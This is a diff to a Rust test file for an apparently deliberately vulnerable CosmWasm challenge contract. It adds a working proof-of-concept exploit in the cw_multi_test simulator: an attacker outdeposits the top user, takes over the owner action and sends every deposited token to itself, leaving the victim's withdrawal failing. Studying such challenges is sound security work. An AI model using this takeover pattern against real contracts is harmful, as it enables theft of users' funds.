@@ -2,9 +2,9 @@
 pub mod tests {
     use crate::{
         contract::DENOM,
-        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
+        msg::{ExecuteMsg, InstantiateMsg, QueryMsg,},
     };
-    use cosmwasm_std::{coin, Addr, Empty, Uint128};
+    use cosmwasm_std::{coin, Addr, Empty, Uint128,  BankMsg, CosmosMsg};
     use cw_multi_test::{App, Contract, ContractWrapper, Executor};
 
     pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
@@ -18,6 +18,7 @@ pub mod tests {
 
     pub const USER1: &str = "user1";
     pub const USER2: &str = "user2";
+    pub const ATTACKER: &str = "attacker";
     pub const ADMIN: &str = "admin";
 
     pub fn proper_instantiate() -> (App, Addr) {
@@ -42,6 +43,7 @@ pub mod tests {
             .unwrap();
 
         app = mint_tokens(app, USER1.to_string(), Uint128::from(100u128));
+        app = mint_tokens(app, ATTACKER.to_string(), Uint128::from(101u128));
 
         (app, contract_addr)
     }
@@ -127,6 +129,28 @@ pub mod tests {
             .unwrap();
         assert_eq!(top, Addr::unchecked(USER1));
 
+        // exploit - simply deposit a higher number than the threshold, and call owner action
+        app.execute_contract(
+            Addr::unchecked(ATTACKER),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(101, DENOM)],
+        )
+        .unwrap();
+
+        app.execute_contract(
+            Addr::unchecked(ATTACKER),
+            contract_addr.clone(),
+            &ExecuteMsg::OwnerAction {
+                msg: CosmosMsg::Bank(BankMsg::Send{
+                    to_address: String::from(ATTACKER),
+                    amount: vec![coin(201u128, DENOM)],
+                }),
+            },
+            &[],
+        )
+        .unwrap();
+
         // User 1 withdraw
         app.execute_contract(
             Addr::unchecked(USER1),
@@ -136,9 +160,13 @@ pub mod tests {
             },
             &[],
         )
-        .unwrap();
+        .unwrap_err();
 
+        // confirm exploit
         let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
-        assert_eq!(bal.amount, Uint128::new(100));
+        assert_eq!(bal.amount, Uint128::new(0));
+
+        let bal = app.wrap().query_balance(ATTACKER, DENOM).unwrap();
+        assert_eq!(bal.amount, Uint128::new(201));
     }
 }
